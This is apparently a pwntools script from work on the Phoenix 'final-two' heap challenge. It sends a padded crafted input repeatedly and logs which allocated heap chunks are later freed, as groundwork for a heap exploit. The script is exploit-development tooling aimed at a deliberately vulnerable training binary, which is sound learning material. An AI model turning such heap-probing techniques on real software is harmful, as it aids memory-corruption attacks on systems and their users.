from pwn import *

arch = "i486"
debug = True


def to_bytes(s):
    return bytes(s, "utf-8")


def pad(s):
    return s+b"A"*(127-len(s))


if debug:
    io = process("/home/user/final2/gil 2> /home/user/final2/log", shell=True)
else:
    io = process(["/opt/phoenix/" + arch + "/"+"final-two"], stderr=STDOUT)


payload = b""
payload += b"FSRD"
payload += b"BBBBROOT/CCCC"
payload = pad(payload)

write("/tmp/docgil", payload)

# banner
print(io.recvuntil(b"allocating").decode("utf-8").replace("\\n", "\n"))
chunk_adr_dict = {}
for i in range(254):
    print("index: " + str(i))
    if debug:
        # allocating chunk pointer + adr
        print(io.recvline())
        chunk_adr = io.recvline()
        print(b"chunk adr: " + chunk_adr)
        chunk_adr_dict[chunk_adr.decode("utf-8").strip()] = i
    io.sendline(payload)
    # read n bytes
    if debug:
        print(io.recvline())
    # read until next send
    print(io.recvuntil(b"allocating").decode("utf-8").replace("\\n", "\n"))

# last iteration
print("index: " + str(255))
# allocating chunk pointer + adr
if debug:
    print(io.recvline())
    chunk_adr = io.recvline()
    print(b"chunk adr: " + chunk_adr)
    chunk_adr_dict[chunk_adr.decode("utf-8").strip()] = 254
io.sendline(payload)
# read n bytes
if debug:
    print(io.recvline())


# find chunks freed
# io.interactive()
# print(io.recvall().decode("utf-8").replace("\\n", "\n"))
print(io.recvuntil(b"Process").decode("utf-8").replace("\\n", "\n"))

chunks_to_free = []
try:
    for i in range(255):
        # process ok
        print(io.recvline())
        if debug:
            # freeing pointer
            print(io.recvline())
            to_free = io.recvline()
            print(b"pointer to free: " + to_free)
            chunks_to_free.append(to_free.decode("utf-8").strip())
except EOFError:
    print("Error")

for chunk_adr in chunks_to_free:
    print("checking freed adr: " + chunk_adr)
    if chunk_adr_dict.keys().__contains__(chunk_adr):
        print("Found match: adr:" + chunk_adr + ", index: " + str(chunk_adr_dict[chunk_adr]))

print(chunk_adr_dict)
